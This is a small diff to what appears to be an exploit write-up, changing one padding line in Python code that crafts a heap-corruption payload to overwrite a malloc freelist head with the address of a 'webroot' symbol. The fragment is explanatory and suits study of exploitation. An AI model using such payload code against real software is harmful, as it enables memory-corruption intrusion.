@@ -313,7 +313,7 @@ Let's walk through the final exploit:
    # the address we want to write to malloc_freelist_heads[0]
    w_real_addr = p64(velf.symbols['webroot'] - 1)
    # the padding we need so that this is allocated in bin 1
-   w_addr_pad = "X" * (bins[1][0] - strlen(w_real_addr))
+   w_addr_pad = "X" * (16 - strlen(w_real_addr))
    w_addr =  w_addr_pad + w_real_addr
 
    # we want to write to malloc_freelist_heads[0]
